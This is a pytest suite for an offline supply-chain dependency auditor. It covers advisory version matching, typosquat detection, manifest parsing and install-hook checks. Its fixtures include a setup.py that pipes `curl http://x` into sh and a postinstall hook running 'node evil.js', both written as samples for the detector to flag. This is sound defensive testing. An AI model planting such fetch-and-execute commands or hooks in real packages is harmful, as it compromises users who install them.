"""Tests for the v0.5 supply-chain / dependency audit (ASI04).

All tests are fully OFFLINE: the OSV.dev live path is never exercised here
(audits default to online=False), so the suite is deterministic and runs on an
air-gapped box. The shipped offline advisory DB + committed fixtures are the
single source of truth.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from mcpscan import supplychain as sc
from mcpscan.core import (
    audit_dependencies,
    ScanError,
    to_json,
    to_sarif,
    to_html,
)
from mcpscan.agentic import asi_for


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

def _write(p: Path, name: str, body: str) -> Path:
    f = p / name
    f.write_text(body, encoding="utf-8")
    return f


@pytest.fixture
def advisories():
    return sc.load_advisories()


@pytest.fixture
def popular():
    return sc.load_popular()


# ---------------------------------------------------------------------------
# parse_version + comparison
# ---------------------------------------------------------------------------

def test_parse_version_simple():
    assert sc.parse_version("1.2.3") == (1, 2, 3)


def test_parse_version_v_prefix():
    assert sc.parse_version("v2.10.1") == (2, 10, 1)


def test_parse_version_equals_prefix():
    assert sc.parse_version("==3.1.6") == (3, 1, 6)


def test_parse_version_prerelease_stripped():
    # the dotted release is kept; a trailing non-numeric tag in a chunk stops
    # at its leading digits (2.11.3rc1 -> 2.11.3)
    assert sc.parse_version("2.11.3rc1") == (2, 11, 3)


def test_parse_version_local_segment():
    assert sc.parse_version("1.0.0+local.7") == (1, 0, 0)


def test_parse_version_garbage_defaults_zero():
    assert sc.parse_version("not-a-version") == (0,)


def test_parse_version_empty():
    assert sc.parse_version("") == (0,)


def test_cmp_padding():
    # 2.11 should equal 2.11.0 for ordering purposes
    assert sc._cmp(sc.parse_version("2.11"), sc.parse_version("2.11.0")) == 0


def test_cmp_less():
    assert sc._cmp((2, 4, 1), (2, 10, 1)) == -1


def test_cmp_greater():
    assert sc._cmp((3, 0, 0), (2, 99, 99)) == 1


# ---------------------------------------------------------------------------
# version_in_range (OSV semantics)
# ---------------------------------------------------------------------------

def test_range_below_introduced_excluded():
    assert not sc.version_in_range("1.0.0", {"introduced": "2.0.0", "fixed": "2.5.0"})


def test_range_at_introduced_included():
    assert sc.version_in_range("2.0.0", {"introduced": "2.0.0", "fixed": "2.5.0"})


def test_range_below_fixed_included():
    assert sc.version_in_range("2.4.9", {"introduced": "2.0.0", "fixed": "2.5.0"})


def test_range_at_fixed_excluded():
    assert not sc.version_in_range("2.5.0", {"introduced": "2.0.0", "fixed": "2.5.0"})


def test_range_above_fixed_excluded():
    assert not sc.version_in_range("3.0.0", {"introduced": "0", "fixed": "2.5.0"})


def test_range_no_fixed_open_ended():
    assert sc.version_in_range("99.0.0", {"introduced": "1.0.0"})


def test_range_last_affected():
    assert sc.version_in_range("1.2.0", {"introduced": "1.0.0", "last_affected": "1.2.0"})
    assert not sc.version_in_range("1.2.1", {"introduced": "1.0.0", "last_affected": "1.2.0"})


# ---------------------------------------------------------------------------
# Advisory DB load + match
# ---------------------------------------------------------------------------

def test_advisories_load_nonempty(advisories):
    assert len(advisories) >= 8


def test_advisories_have_required_fields(advisories):
    for adv in advisories:
        assert adv["id"]
        assert adv["ecosystem"] in ("PyPI", "npm")
        assert adv["package"]
        assert adv["ranges"]


def test_advisories_load_missing_file_returns_empty():
    assert sc.load_advisories("/no/such/file.json") == []


def _dep(name, ver, eco="PyPI"):
    return sc.Dependency(name=name, raw_spec=f"=={ver}", pinned_version=ver,
                         ecosystem=eco, section="dependencies", location="x")


def test_match_known_vuln_jinja_old(advisories):
    hits = sc.match_advisories(_dep("jinja2", "2.4.1"), advisories)
    ids = {h["id"] for h in hits}
    assert "GHSA-462w-v97r-4m45" in ids  # CVE-2019-10906


def test_match_fixed_version_clean(advisories):
    assert sc.match_advisories(_dep("jinja2", "3.1.6"), advisories) == []


def test_match_case_insensitive_name(advisories):
    hits = sc.match_advisories(_dep("Jinja2", "2.4.1"), advisories)
    assert hits


def test_match_unpinned_returns_nothing(advisories):
    d = sc.Dependency("jinja2", ">=2.0", None, "PyPI", "dependencies", "x")
    assert sc.match_advisories(d, advisories) == []


def test_match_npm_ws(advisories):
    hits = sc.match_advisories(_dep("ws", "8.10.0", "npm"), advisories)
    assert any("CVE-2024-37890" in (h.get("aliases") or []) for h in hits)


def test_match_npm_ws_patched_clean(advisories):
    assert sc.match_advisories(_dep("ws", "8.18.0", "npm"), advisories) == []


def test_match_ecosystem_isolation(advisories):
    # a PyPI package name should not match an npm advisory of the same string
    d = sc.Dependency("ws", "8.10.0", "8.10.0", "PyPI", "dependencies", "x")
    assert sc.match_advisories(d, advisories) == []


def test_requests_range_introduced(advisories):
    # CVE-2024-35195 introduced 2.3.0, fixed 2.32.0 -> 2.20.0 affected, but a
    # specific advisory should not fire below its introduced bound.
    hits_20 = {h["id"] for h in sc.match_advisories(_dep("requests", "2.20.0"), advisories)}
    assert "GHSA-w596-4wvx-j9j6" in hits_20  # CVE-2024-35195 (introduced 2.3.0)
    hits_1 = {h["id"] for h in sc.match_advisories(_dep("requests", "2.1.0"), advisories)}
    assert "GHSA-w596-4wvx-j9j6" not in hits_1  # below introduced 2.3.0
    # a fully patched modern release clears all requests advisories
    assert sc.match_advisories(_dep("requests", "2.32.3"), advisories) == []


# ---------------------------------------------------------------------------
# Edit distance + typosquat
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("a,b,expected", [
    ("lodash", "loadash", True),    # insertion
    ("requests", "reqests", True),  # deletion
    ("numpy", "numpi", True),       # substitution
    ("requests", "requests", False),  # identical -> not a near-miss
    ("flask", "django", False),     # far
    ("ab", "abcd", False),          # distance 2 by length
])
def test_edit_distance_le1(a, b, expected):
    assert sc._edit_distance_le1(a, b) is expected


def test_typosquat_flags_near_miss(popular):
    assert "lodash" in sc.typosquat_candidates("loadash", "npm", popular)


def test_typosquat_ignores_exact_popular(popular):
    assert sc.typosquat_candidates("lodash", "npm", popular) == []


def test_typosquat_ignores_unrelated(popular):
    assert sc.typosquat_candidates("my-internal-tool-xyz", "npm", popular) == []


def test_typosquat_pypi(popular):
    assert "requests" in sc.typosquat_candidates("reqests", "PyPI", popular)


# ---------------------------------------------------------------------------
# parse_requirements
# ---------------------------------------------------------------------------

def test_parse_requirements_pinned():
    deps = sc.parse_requirements("r.txt", "jinja2==3.1.6\n")
    assert deps[0].name == "jinja2"
    assert deps[0].pinned_version == "3.1.6"


def test_parse_requirements_unpinned():
    deps = sc.parse_requirements("r.txt", "requests>=2.0\n")
    assert deps[0].pinned_version is None


def test_parse_requirements_bare_name():
    deps = sc.parse_requirements("r.txt", "flask\n")
    assert deps[0].name == "flask"
    assert deps[0].pinned_version is None


def test_parse_requirements_skips_comments_and_flags():
    deps = sc.parse_requirements("r.txt", "# comment\n-r other.txt\n--index-url x\nflask\n")
    assert [d.name for d in deps] == ["flask"]


def test_parse_requirements_extras():
    deps = sc.parse_requirements("r.txt", "uvicorn[standard]==0.30.0\n")
    assert deps[0].name == "uvicorn"
    assert deps[0].pinned_version == "0.30.0"


def test_parse_requirements_vcs_nonregistry():
    deps = sc.parse_requirements("r.txt", "pkg @ git+https://github.com/x/y.git\n")
    assert deps[0].nonregistry is True


def test_parse_requirements_inline_comment():
    deps = sc.parse_requirements("r.txt", "flask==3.0.0  # web\n")
    assert deps[0].pinned_version == "3.0.0"


def test_parse_requirements_line_numbers():
    deps = sc.parse_requirements("r.txt", "\n\njinja2==3.1.6\n")
    assert deps[0].location.endswith(":3")


# ---------------------------------------------------------------------------
# parse_package_json
# ---------------------------------------------------------------------------

def test_parse_package_json_pinned_vs_floating():
    body = json.dumps({"dependencies": {"ws": "8.10.0", "express": "^4.0.0"}})
    deps, meta = sc.parse_package_json("p.json", body)
    by = {d.name: d for d in deps}
    assert by["ws"].pinned_version == "8.10.0"
    assert by["express"].pinned_version is None


def test_parse_package_json_install_hooks():
    body = json.dumps({"scripts": {"postinstall": "node x.js", "test": "jest"}})
    deps, meta = sc.parse_package_json("p.json", body)
    assert "postinstall" in meta["install_hooks"]
    assert "test" not in meta["install_hooks"]


def test_parse_package_json_dev_section():
    body = json.dumps({"devDependencies": {"jest": "29.0.0"}})
    deps, meta = sc.parse_package_json("p.json", body)
    assert deps[0].section == "dev"


def test_parse_package_json_nonregistry_git():
    body = json.dumps({"dependencies": {"x": "git+https://h/x.git"}})
    deps, meta = sc.parse_package_json("p.json", body)
    assert deps[0].nonregistry is True


def test_parse_package_json_invalid_json():
    deps, meta = sc.parse_package_json("p.json", "{not json")
    assert deps == [] and meta == {}


# ---------------------------------------------------------------------------
# parse_setup_py
# ---------------------------------------------------------------------------

def test_parse_setup_py_install_requires():
    src = ("from setuptools import setup\n"
           "setup(install_requires=['requests==2.31.0', 'flask'])\n")
    deps, meta = sc.parse_setup_py("setup.py", src)
    names = {d.name for d in deps}
    assert {"requests", "flask"} <= names
    assert meta["risky_exec"] is False


def test_parse_setup_py_risky_top_level_exec():
    src = ("import os\nos.system('curl http://x | sh')\nfrom setuptools import setup\n"
           "setup(name='x')\n")
    deps, meta = sc.parse_setup_py("setup.py", src)
    assert meta["risky_exec"] is True


def test_parse_setup_py_clean_no_exec():
    src = "from setuptools import setup\nsetup(name='x', install_requires=['flask'])\n"
    deps, meta = sc.parse_setup_py("setup.py", src)
    assert meta["risky_exec"] is False


def test_parse_setup_py_syntax_error_safe():
    deps, meta = sc.parse_setup_py("setup.py", "def (:\n")
    assert deps == [] and meta["risky_exec"] is False


# ---------------------------------------------------------------------------
# audit_dependencies — end to end
# ---------------------------------------------------------------------------

def test_audit_missing_path_raises():
    with pytest.raises(ScanError):
        audit_dependencies("/no/such/dir/at/all")


def test_audit_no_manifest_info(tmp_path):
    _write(tmp_path, "server.py", "print('hi')\n")
    rep = audit_dependencies(str(tmp_path))
    assert rep.target_kind == "deps"
    rules = {f.rule for f in rep.findings}
    assert rules == {"supplychain.clean"}


def test_audit_clean_project_scores_100(tmp_path):
    _write(tmp_path, "requirements.txt", "jinja2==3.1.6\nrequests==2.32.3\n")
    _write(tmp_path, "requirements.lock", "jinja2==3.1.6\n")
    rep = audit_dependencies(str(tmp_path))
    assert rep.score == 100
    assert any(f.rule == "supplychain.clean" for f in rep.findings)


def test_audit_known_vuln_detected(tmp_path):
    _write(tmp_path, "requirements.txt", "jinja2==2.4.1\n")
    rep = audit_dependencies(str(tmp_path))
    kv = [f for f in rep.findings if f.rule == "supplychain.known_vuln"]
    assert kv
    assert any("CVE-2019-10906" in f.message for f in kv)


def test_audit_unpinned_detected(tmp_path):
    _write(tmp_path, "requirements.txt", "flask\n")
    rep = audit_dependencies(str(tmp_path))
    assert any(f.rule == "supplychain.unpinned" for f in rep.findings)


def test_audit_no_lockfile_detected(tmp_path):
    _write(tmp_path, "requirements.txt", "jinja2==3.1.6\n")
    rep = audit_dependencies(str(tmp_path))
    assert any(f.rule == "supplychain.no_lockfile" for f in rep.findings)


def test_audit_lockfile_suppresses_no_lockfile(tmp_path):
    _write(tmp_path, "requirements.txt", "jinja2==3.1.6\n")
    _write(tmp_path, "requirements.lock", "jinja2==3.1.6\n")
    rep = audit_dependencies(str(tmp_path))
    assert not any(f.rule == "supplychain.no_lockfile" for f in rep.findings)


def test_audit_install_hook_high(tmp_path):
    body = json.dumps({"scripts": {"postinstall": "node evil.js"},
                       "dependencies": {"x": "1.0.0"}})
    _write(tmp_path, "package.json", body)
    rep = audit_dependencies(str(tmp_path))
    hooks = [f for f in rep.findings if f.rule == "supplychain.install_hook"]
    assert hooks and hooks[0].severity == "high"


def test_audit_typosquat(tmp_path):
    _write(tmp_path, "requirements.txt", "reqests==1.0.0\n")
    rep = audit_dependencies(str(tmp_path))
    assert any(f.rule == "supplychain.typosquat" for f in rep.findings)


def test_audit_nonregistry(tmp_path):
    _write(tmp_path, "requirements.txt", "pkg @ git+https://h/p.git\n")
    rep = audit_dependencies(str(tmp_path))
    assert any(f.rule == "supplychain.nonregistry_source" for f in rep.findings)


def test_audit_setup_py_risky(tmp_path):
    _write(tmp_path, "setup.py",
           "import os\nos.system('x')\nfrom setuptools import setup\nsetup(name='x')\n")
    rep = audit_dependencies(str(tmp_path))
    assert any(f.rule == "supplychain.install_hook" for f in rep.findings)


def test_audit_skips_node_modules(tmp_path):
    proj = tmp_path / "proj"
    nm = proj / "node_modules" / "dep"
    nm.mkdir(parents=True)
    _write(nm, "package.json", json.dumps({"dependencies": {"reqests": "^1.0.0"}}))
    rep = audit_dependencies(str(proj))
    # the vendored manifest under node_modules must not be scanned
    assert rep.files_scanned == 0
    assert {f.rule for f in rep.findings} == {"supplychain.clean"}


def test_audit_single_file_target(tmp_path):
    f = _write(tmp_path, "requirements.txt", "jinja2==2.4.1\n")
    rep = audit_dependencies(str(f))
    assert any(f.rule == "supplychain.known_vuln" for f in rep.findings)


def test_audit_all_findings_map_to_asi04(tmp_path):
    _write(tmp_path, "requirements.txt", "jinja2==2.4.1\nflask\nreqests==1.0.0\n")
    rep = audit_dependencies(str(tmp_path))
    for f in rep.findings:
        if f.rule == "supplychain.clean":
            continue
        c = asi_for(cwe=f.cwe, owasp_llm=f.owasp_llm, ms_taxonomy=f.ms_taxonomy)
        assert c is not None and c.id == "ASI04", f.rule


def test_audit_custom_advisory_db(tmp_path):
    db = tmp_path / "adv.json"
    db.write_text(json.dumps({"advisories": [{
        "id": "TEST-1", "aliases": ["CVE-9999-0001"], "ecosystem": "PyPI",
        "package": "flask", "summary": "test", "severity": "critical",
        "ranges": [{"introduced": "0", "fixed": "99.0.0"}]}]}), encoding="utf-8")
    proj = tmp_path / "proj"
    proj.mkdir()
    _write(proj, "requirements.txt", "flask==3.0.0\n")
    rep = audit_dependencies(str(proj), advisory_db=str(db))
    kv = [f for f in rep.findings if f.rule == "supplychain.known_vuln"]
    assert kv and kv[0].severity == "critical"


def test_audit_pyproject_dependencies(tmp_path):
    body = ('[project]\nname = "x"\n'
            'dependencies = ["jinja2==2.4.1", "requests"]\n')
    _write(tmp_path, "pyproject.toml", body)
    rep = audit_dependencies(str(tmp_path))
    rules = {f.rule for f in rep.findings}
    assert "supplychain.known_vuln" in rules


# ---------------------------------------------------------------------------
# Export formats with deps reports
# ---------------------------------------------------------------------------

def test_deps_report_to_json(tmp_path):
    _write(tmp_path, "requirements.txt", "jinja2==2.4.1\n")
    rep = audit_dependencies(str(tmp_path))
    data = json.loads(to_json(rep))
    assert data["target_kind"] == "deps"
    assert data["findings"]


def test_deps_report_to_sarif(tmp_path):
    _write(tmp_path, "requirements.txt", "jinja2==2.4.1\n")
    rep = audit_dependencies(str(tmp_path))
    doc = json.loads(to_sarif(rep))
    assert doc["runs"][0]["results"]


def test_deps_report_to_html(tmp_path):
    _write(tmp_path, "requirements.txt", "jinja2==2.4.1\n")
    rep = audit_dependencies(str(tmp_path))
    html = to_html(rep)
    assert "jinja2" in html or "supplychain" in html


def test_deps_report_fail_on_high(tmp_path):
    _write(tmp_path, "requirements.txt", "jinja2==2.4.1\n")
    rep = audit_dependencies(str(tmp_path))
    assert rep.fail("high") is True


def test_deps_clean_report_does_not_fail(tmp_path):
    _write(tmp_path, "requirements.txt", "jinja2==3.1.6\n")
    _write(tmp_path, "requirements.lock", "jinja2==3.1.6\n")
    rep = audit_dependencies(str(tmp_path))
    assert rep.fail("high") is False


# ---------------------------------------------------------------------------
# CLI integration (deps subcommand)
# ---------------------------------------------------------------------------

def test_cli_deps_table(tmp_path, capsys):
    from mcpscan.cli import main
    _write(tmp_path, "requirements.txt", "jinja2==2.4.1\n")
    rc = main(["deps", str(tmp_path)])
    out = capsys.readouterr().out
    assert "dependency audit" in out
    assert "known_vuln" in out
    assert rc == 0


def test_cli_deps_fail_on_high(tmp_path):
    from mcpscan.cli import main
    _write(tmp_path, "requirements.txt", "jinja2==2.4.1\n")
    rc = main(["deps", str(tmp_path), "--fail-on", "high"])
    assert rc == 1


def test_cli_deps_clean_exit_zero(tmp_path):
    from mcpscan.cli import main
    _write(tmp_path, "requirements.txt", "jinja2==3.1.6\n")
    _write(tmp_path, "requirements.lock", "jinja2==3.1.6\n")
    rc = main(["deps", str(tmp_path), "--fail-on", "low"])
    assert rc == 0


def test_cli_deps_json_out(tmp_path):
    from mcpscan.cli import main
    _write(tmp_path, "requirements.txt", "jinja2==2.4.1\n")
    out = tmp_path / "report.json"
    rc = main(["deps", str(tmp_path), "--format", "json", "--out", str(out)])
    assert rc == 0
    data = json.loads(out.read_text(encoding="utf-8"))
    assert data["target_kind"] == "deps"
    # the JSON emitter enriches with owasp_asi
    assert any(f.get("owasp_asi") == "ASI04" for f in data["findings"])


def test_cli_deps_missing_path(tmp_path, capsys):
    from mcpscan.cli import main
    rc = main(["deps", str(tmp_path / "nope")])
    assert rc == 2


# ---------------------------------------------------------------------------
# Determinism + offline guarantee
# ---------------------------------------------------------------------------

def test_audit_is_deterministic(tmp_path):
    _write(tmp_path, "requirements.txt", "jinja2==2.4.1\nflask\nreqests==1.0.0\n")
    a = to_json(audit_dependencies(str(tmp_path)))
    b = to_json(audit_dependencies(str(tmp_path)))
    assert a == b


def test_audit_offline_never_calls_network(tmp_path, monkeypatch):
    def _boom(*a, **k):
        raise AssertionError("offline audit must not touch the network")
    monkeypatch.setattr(sc.urllib.request, "urlopen", _boom)
    _write(tmp_path, "requirements.txt", "jinja2==2.4.1\n")
    rep = audit_dependencies(str(tmp_path), online=False)
    assert any(f.rule == "supplychain.known_vuln" for f in rep.findings)


def test_osv_live_failure_returns_empty(monkeypatch):
    def _boom(*a, **k):
        raise OSError("no network")
    monkeypatch.setattr(sc.urllib.request, "urlopen", _boom)
    assert sc.osv_query_live("jinja2", "2.4.1", "PyPI") == []


def test_popular_load_missing_returns_empty_sets():
    p = sc.load_popular("/no/such/popular.json")
    assert p == {"PyPI": set(), "npm": set()}
